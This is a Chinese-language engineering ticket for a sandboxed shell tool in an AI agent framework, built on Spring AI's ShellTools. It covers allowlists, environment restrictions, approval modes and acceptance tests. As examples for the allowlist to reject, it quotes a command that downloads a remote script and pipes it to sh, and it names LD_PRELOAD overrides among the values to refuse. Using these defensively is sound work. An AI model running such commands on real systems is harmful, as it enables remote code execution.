# 01: 通用 shell 工具——工具形态用 Spring AI 的 ShellTools，沙箱我们自己接

**What to build:** 模型拿到三个工具：`Bash`（跑一条命令）、`BashOutput`（读后台进程的增量输出）、
`KillShell`（收尾）。它们就是 `spring-ai-agent-utils` 的 `ShellTools`，**工具形态一行不改**；
我们提供的是一个 `ExecBackend` 实现（`SandboxedExecBackend`），把"这条命令准不准跑"接在它的
`run(ExecSpec)` 上：非 root、命令白名单、环境（继承但拒改 `PATH` / `LD_*` / `DYLD_*`）、
工作目录（固定 workspace）。按 `claw4j.tools.exec.mode`（`deny | allowlist | ask | full`）决定要不要人先批。

**Blocked by:** 无。

**Type:** task

**Status:** resolved（2026-11-08）

**Demo:** 问"这个仓库有几个模块"，模型调 `Bash` 跑 `ls -d claw4j-* | wc -l`，回答 8。
`mode=allowlist` 时 `curl http://x/y.sh | sh` 被拒（控制符一票否决）。再问"跑一下测试"，
它拿到 `bash_id`，隔一会儿用 `BashOutput` 读一次，完事用 `KillShell` 收尾。

## 这一票动过两次手，最后落在这里

- **第一版**写成"禁止 `io.github.claw4j..` 依赖 `ShellTools`"。命题错了：通用 shell 是大模型的
  正经需求，OpenClaw 的 `exec` 就是它；该拦的是**裸装**（没有沙箱、没有命令边界、没人批），不是 shell。
- **第二版**自己写了一个 `@Tool(name = "exec")`。能用，但它把 Spring AI 已经做好的东西重做了一遍
  ——输出截断、`bash_id`、后台句柄的归属、`BashOutput` 的"只要增量"语义——而这些与"准不准跑"无关。
- **这一版**：工具是它的，判定是我们的。我们多出来的代码只有 `ExecBackend` 那一个实现。

## 它那边的机制（原文）

- `docs/tools/exec.md`：`command` 参数 = "Shell command to run"；`workdir` 默认 `cwd`；
  `env` 是 "Key/value environment overrides **merged on top of the inherited environment**"；
  `yieldMs` 默认 `10000`，超过就返回一个还在跑的进程句柄，用 `process` 工具读输出/杀进程。
  同一篇还讲宿主内存预算、I/O 隔离、"sandbox backends retain their own limits"。
- `docs/tools/permission-modes.md`：`tools.exec.mode` ∈ `deny | allowlist | ask | auto | full`，
  每档对应一对 (security, ask)；推荐默认 `auto`（allowlist 命中直接跑，未命中交复核器）。
- `docs/tools/exec-approvals.md`：命令只在 "policy + allowlist + (optional) user approval"
  三方都同意时执行；批准是 durable 的（同一条命令不必重复问）。

## 逐项对齐

| 机制 | 它 | 我们这一版 | 判 |
| --- | --- | --- | --- |
| 命令字符串经 shell 执行 | `bash -c`（`LocalExecBackend`） | `/bin/sh -c`（`ShellCommandRunner`，全仓唯一出现解释器的地方） | 一致（不做 bash 专有语法，见"不要做"） |
| 工具形态 | `exec` + `process`（读/杀） | `Bash` / `BashOutput` / `KillShell`——名字是 Spring AI 库的，对应它的 1 + 2 | 一致（拆成三个） |
| `workdir` | 参数，默认 `cwd` | **不是参数**：固定 `claw4j.tools.exec.workspace`；要换目录在命令里 `cd` | 更严（模型改不了路径） |
| `env` | 参数，继承 + 覆盖；`PATH` / `LD_*` / `DYLD_*` 的覆盖被拒（防二进制劫持） | 参数里没有（库的签名如此）；仍然继承 + 拒改那三类，另注入 `CLAW4J_SHELL=exec` | 一致（覆盖入口不同，见下） |
| 超时 / 后台 | `yieldMs` 转后台 + `process` 工具 | `timeout` 由 `ExecSpec` 管（默认 2 分钟、上限 10 分钟）；`runInBackground` 走真正的后台，`BashOutput` 读增量、`KillShell` 收尾 | 一致 |
| 审批 | `mode` 五档 + allowlist + durable grant | `mode` 四档（无 `auto`）+ 白名单 + `ToolPermission#requiringApproval`；**默认 `full`**（它的 baseline） | **偏离 1** |
| 输出 | 有 byte budget | 库的：30000 字符截断 | 一致（数字不同） |

### 默认档：`full`，闸在授权表

它未配置时的 baseline 是 `full` / `off`（`exec-approvals.md`："An unconfigured node uses the same
`full` / `off` baseline as the Gateway"）；它给"会用 shell 的编码 agent"的**推荐值**是 `auto`
（`permission-modes.md`），而 `auto` 需要那个原生复核器。

所以这版：`mode` 默认 **`full`**（照它的 baseline），`auto` 不做（见偏离 1）。
**安全位不在 mode 上，在授权表上**：`exec_command` 这个动作默认只给 `admin`，
`read-only` / `guest` 在 `application.yml` 里就没有它——这条对应它的 tool policy 那一层，
也是我们 ADR-0007 的既有做法。要更严的部署配 `allowlist` 或 `ask`。

### 偏离 1：`ask` 少了"未命中就问人"那一半，且没有 `auto`

它的 `ask` = allowlist 命中直接跑、未命中交人批；`auto` = 同样的 policy + 原生复核器（三次拒绝升级人审）。
我们的审批是**静态标注**在权限上的（`ToolPermission#approval()`），一个工具只有"要批 / 不批"两种登记，
没法按参数内容动态决定。所以：

- `ask`：`requiringApproval` + 白名单兜住"能进审批的命令"（未命中直接拒，不进卡片）。
  比它严：白名单命中也问人。理由：卡片上是一条 shell 字符串，让人去"审"一条任意命令
  等于把人当 WAF；白名单先兜一层，人只决定"这条现在要不要跑"。
- `auto` **不做**：没有复核器，硬造一个就是"让模型审模型"。
- **重开条件（两条一起）**：`Approval` 支持按参数判定（真正 on-miss）时补上 `ask` 的另半；
  有复核器那一层时补 `auto`，并把默认改回它的推荐值。

（一条对齐得很好的：我们的审批按 `(owner, toolName, argsDigest)` 兑现，同一条命令批过一次不再问——
这正是它的 durable grant。）

### 工具参数里没有 `workdir` / `env`，这不是漏

`ShellTools` 的三个方法签名是 `bash(command, timeout, description, runInBackground)`、
`bashOutput(bash_id, filter)`、`killShell(bash_id)`——**没有 workdir，也没有 env 参数**。
所以：

- 目录固定是 `workspace`（装配时校验是已存在目录）。模型要换目录就在命令里 `cd sub && …`，
  那是 shell 的事，跟我们无关；出不出得去由操作系统的权限决定，不由我们"判路径"。
  第二版自己写工具时用 `resolveInside` 判过这一层，现在这条路没了——这是本版**更弱**的一处，
  换来的是模型不可能拿到 workspace 之外的 cwd。
- 环境同理：模型要临时改一个变量就写 `FOO=bar cmd`。`ExecBackend` 的 `ExecSpec` 仍然带
  `Map<String,String> env`，`ExecPolicy.environment` 仍然拒改那三类（今天这条判断是"备而不用"，
  但它是**判据本身**，与"调用方现在能不能传"无关）。

### 继承 env 的后果，要写在配置注释里

继承是它的设计，但我们的 `scripts/verify.sh` 会 `set -a; . ./.env`，把 `DEEPSEEK_API_KEY` 之类
导进**进程环境**，测试与会话里 `exec` 就看得见它们。生产用 `java -jar` 走的是 Spring 的
config import（`.env` 进 Environment，不进 OS env），所以这一条主要影响本机与 CI。
`application.yml` 注释里写明了：**不要把密钥 export 到进程环境**。

## 红线要改，这张票就是那次裁决

`BuildContractTest` 原本两条：只允许 `LocalProcessRunner` 依赖 `ProcessBuilder`；
主代码里不许出现 `sh -c` / `bash -c` / `cmd.exe` 字面量。`exec` 两样都要碰。

按 `docs/agents/guardrails.md`「改一条红线，就新开一张票」——**这张票就是那张票**。
要写清的是"原来那条红线拦住的是对的"：它拦住的是"随手把一条**我们拼好的**命令交给解释器"，
而 `exec` 是**有意**交出去（要的就是管道、重定向、`&&`）。区别在于这条字符串**不再由我们拼**，
模型给什么就是什么，于是风险变了形态：从"注入我们拼的字符串"变成"模型能执行任意命令"——
那要靠沙箱、白名单、审批来管，不是靠禁止 `-c`。

落地：

1. 新增 `ShellCommandRunner`（`capability.process`），**唯一**允许出现 `sh -c` 的类。
   `BuildContractTest` 的放行名单从 1 个类变 2 个；`noHandWrittenShellInvocations` 用
   "点名文件豁免"（`SHELL_ENTRY = "ShellCommandRunner.java"`），不是把 shell 名单删掉。
2. `ShellTools` 那条规则**换命题**：从"不许依赖它"改成"**只许在一个地方把它造出来**"——
   因为裸造（`ShellTools.builder().build()`）默认 `LocalExecBackend`，把 env 白名单、
   非 root、命令白名单一次作废。规则点名 `ExecAutoConfiguration` 一个类，`builder()` 与
   构造器两条路都在查（两条分支各跑过一次红，见 Comments）。

## 要做

1. `ExecProperties`（`claw4j.tools.exec`）：`mode`（**默认 `full`**，照它的 baseline）、
   `workspace`（默认是进程工作目录，照它 `workdir` 默认 `cwd`；显式配了就必须是已存在的目录）、
   `allow`（命令白名单）。`mode` 用枚举绑定，**写错的词启动失败**（不许回落成默认档——那等于写错变成放宽）。
   **不加 `enabled`**：`mode=deny` 就是不装配，两个开关管一件事迟早不一致（pitfalls 第十条）。
   **不加超时配置**：`ExecSpec` 已经定了默认 2 分钟 / 上限 10 分钟，两个默认值管一件事迟早不一样。
2. `ShellCommandRunner`：`ProcessBuilder("/bin/sh", "-c", command)`；cwd、env、超时由调用方给。
   两个入口：`run(...)` 同步等到结束（超时即杀），`start(...)` 起一个 `ShellProcess` 交出去
   （后台那条路要"边跑边看"，所以逐块收流而不是攒成一个字符串）。
3. `ShellProcess`：后台句柄的底层（进程 + 两路缓冲 + 已读位置）。`newOutput(filter)` 只给增量，
   带过滤时没匹配上的也算已读——否则"增量"不单调。它不 new 任何进程对象，所以不多出一个起进程的入口。
4. `SandboxedExecBackend`：`ExecBackend` 的实现。`run` 里判 → 交 `ShellCommandRunner` → 翻成
   `ExecResult`；`start` 里判 → 起后台 → 包成 `ExecHandle`；`destroy()` 把还活着的后台进程收掉
   （`KillShell` 是模型的礼貌，不能当回收机制）。
5. `ExecAutoConfiguration`：`workspace` 是目录才装配（不是就启动失败并点名）；`mode=deny` 时一个
   bean 都不产；产出 `ShellTools`（塞 `SandboxedExecBackend`）、`ToolCallbackProvider`、
   `ToolPermissionRegistry`（动作 `exec_command`，`mode=ask` 用 `requiringApproval`，其余用 `of`，
   三个工具名一起登记）、`ToolTierRegistry`（`ToolTier.CODING`，与 `run_script` 同档）。
6. 文档：`application.yml` 注释（四档含义、**默认 `full` 的来由**、白名单写法与"按整条命令匹配"、
   参数里为什么没有 workdir/env、"别把密钥 export 到进程环境"）、`guardrails.md` 两行。

## 验收判据（反例都要能红）

- [x] `echo hello` 跑通，stdout 交回（工具自己的 `bash_id` 头也在）。
      - `ExecToolTest#runsACommandThroughTheLibraryTool`。
- [x] 退出码非零时 `STDERR:` 与 `Exit code: 7` 都交回。
      - `ExecToolTest#nonZeroExitKeepsStderrAndExitCode`。
- [x] **环境照它的做法**：继承的变量读得到、`CLAW4J_SHELL=exec` 读得到；`PATH` / `LD_PRELOAD`
      的覆盖直接拒；普通变量合并生效。
      - `ExecToolTest#inheritsEnvironmentAndMarksItself`、`#refusesToOverridePathAndLoaderVariables`。
      反例：`forbidden(name)` 改成 `false` → 后者红（见 Comments）。
- [x] **白名单按整条命令匹配**：`ls` 通过；`ls; curl … | sh`、`echo $(ls)`、`echo hi > out.txt`
      三条开头都在白名单里，必须被控制符一票否决。
      - `ExecToolTest#allowlistRefusesShellControlOperators`。反例：去掉控制符判定 → 这条红（见 Comments）。
- [x] 超时即杀：`sleep 5` + `timeout=300` → 返回 `timed out after 300ms`，用例耗时 < 4 秒。
      - `ExecToolTest#timeoutKillsTheProcess`。
- [x] root 身份直接拒，连白名单都不看。
      - `ExecToolTest#refusesToRunAsRoot`。
- [x] **后台那条路走得通**：`runInBackground` 拿 `bash_id` → `BashOutput` 读到输出 → `KillShell` 收尾。
      - `ExecToolTest#backgroundShellCanBeReadAndKilled`。
- [x] **拒绝的话真到得了模型**：经 `MethodToolCallback` 是 `ToolExecutionException`，不是一个裸
      `RuntimeException`（后者模型看不到原因）。
      - `ExecToolTest#refusalReachesTheModelAsAToolExecutionException`。
- [ ] **审批链没端到端验**：`mode=ask` 只验到"三个工具名都登记成 REQUIRED"
      （`#defaultModeIsFullAndAskRequiresApproval`）；"卡片弹出、放行后审计带 `approval_id`、
      同一条命令不再问"要走真模型 + 审批存储，这一轮没做。**这是本票唯一没勾的一条**，
      `ApplicationAssemblyTest#approvalFlowWorksEndToEndWithARealModel` 是现成的模板。
- [x] `mode=deny` 时没有 `ShellTools`；默认（不配 `mode`）是 `full`；显式配一个不存在的 workspace
      启动失败并点名这个键。
      - `ExecToolTest#assemblesOnlyWhenAllowed`、`#defaultModeIsFullAndAskRequiresApproval`。
- [x] 档位 `CODING`：`ApplicationAssemblyTest#messagingManifestCannotExposeCodingTools` 照旧绿——
      它按档位筛"跑代码"那一类，三个工具跟着这一类被一起拿掉；**没有为 exec 单独写一条断言**。
- [x] 红线：`BuildContractTest` 两条规则各点名放行；`ShellTools` 那条**两条分支都跑过红**
      （`builder()` 与构造器各一次，删掉即绿，见 Comments）。
- [x] 审计里**没有命令原文**：`AuditEvent` 的字段本就是"元数据不是内容"，本票没有加内容字段。
      要追"这条命令是什么"，看审批的 `argsDigest` 与工具日志（截断后）。
- [x] `./scripts/verify.sh` 全绿：**661 条用例、失败 0、错误 0、跳过 0**；
      core 90.4% / channel 75.4% / capability 85.4% / agent 73.2% / app 80.8%；
      模块文件数 10、单文件方法数 20。

## 门禁余量

`claw4j-capability` 10 个文件——做法是把 `PipedStdioClientTransport` 并进
`InProcessStdioMcpServer`（两个类只服务同一件事：进程内的一条 stdio 连接），腾出的那一格给
`ExecToolTest`。`ToolsBoundaryTest` 那条规则改成"起进程的入口只有被点名的两个"。

## 不要做

- **不要自己再写一个 `@Tool exec`**：这一票的第一版做过，等于把输出截断、后台句柄、增量语义
  重做一遍，还得自己维护"哪个 id 属于哪次调用"。
- **不要 bash 专有语法**：`sh -c` 就够；`[[ ]]`、数组、`<<<` 在 dash 上不成立，写了会在某些镜像里
  静默变成另一种行为。要 bash 就给 `claw4j.tools.exec.shell` 加一个可选值，但那要另开票。
- **不要 PTY、不要 durable execution、不要 `host=node` 远程执行**：那是它 gateway 那一层的东西，
  我们没有那个进程模型（`exec.md` 那三节的前提一条都不具备）。
- **不要把 `env` 做成"只给 PATH"**：`PATH` 之外的东西（`HOME`、`LANG`、`JAVA_HOME`）命令都要用
  （`go build`、`mvn` 会直接坏）。继承 + 拒改那三类是它的做法，也是这版的做法。
- **不要把白名单做成"首词相等就算过"**：`ls; curl … | sh` 的首词也是 `ls`（分号前那段），
  按首词放行等于白名单形同虚设。见验收判据第 4 条。

## Comments

- 2026-11-08 实现（第三版）。工具用 `ShellTools`；新增 `capability.exec` 下
  `ExecProperties` / `ExecPolicy` / `SandboxedExecBackend` / `ExecAutoConfiguration` /
  `ExecViolationException`，`capability.process` 下 `ShellCommandRunner` / `ShellProcess`；
  一个自动配置注册、`application.yml` 一段注释、`guardrails.md` 两行。
- **删掉的**：第二版自己写的 `ExecTools`（`@Tool exec`）、`ExecPolicy.resolveInside`
  （`workdir` 不再是参数）、`ExecPolicy.timeoutMillis`（`ExecSpec` 自己 clamp）、
  `ExecProperties.defaultTimeout/maxTimeout`（同上）、`ExecPolicy.isPlainDirectory`（无调用方）。
- **红线换了命题**：`BuildContractTest#shell_tools_must_be_born_with_our_backend` 只放行
  `ExecAutoConfiguration` 一个类造 `ShellTools`。反例跑了两次（改完即还原）：
  1. 探针 `ShellTools.builder().build()` → `violated (1 times)`；
  2. 探针 `new ShellTools()` → `violated (1 times)`。
  两次都点在探针类上，说明 `orShould()` 那半条不是死的——`@ArchTest` 写错成永远匹配不上很常见，
  两条分支各红一次才知道它真的在看。
- **两处判定改坏的真跑反例**：`hasControlOperator` 恒 `false` 与 `forbidden(name)` 恒 `false`
  一起改，结果正好 2 红 9 绿（`allowlistRefusesShellControlOperators`、
  `refusesToOverridePathAndLoaderVariables`），说明这两条断言各自只盯一件事。
- 三处实现上的判断：
  1. **工作区默认是进程工作目录**（`Path.of(".")`），照它 `workdir` 默认 `cwd` 的做法。
     最初写成 `<cwd>/workspace` 并"不存在就启动失败"，结果所有 `@SpringBootTest` 直接起不来——
     fail-fast 加在了默认值上。显式配了不存在的路径仍然启动失败。
  2. **后台不设超时**：后台那条路的意义就是跑得比一次调用久，到点该不该停由 `KillShell` 决定。
     代价是模型忘了收尾就有一个进程留着；兜底是 `SandboxedExecBackend#destroy()` 在容器关闭时
     把它收掉（不能当回收机制，只是不漏）。
  3. **`ShellProcess` 放在 `capability.process` 而不是 `exec`**：它只跟"起进程"有关，与工具形态无关；
     放在 `exec` 会让人以为它认识 `BashOutput`。
- 一处没做完，写在这里不藏：**审批链只验到权限登记**（见验收判据那条）。
- 顺带：`docs/capability-tests.md` 那条"一个工具一条"还没补这三行——它要靠一次真模型问答回读
  `claw4j.tool.calls{tool=Bash}`，与审批链那条一起做更省事。
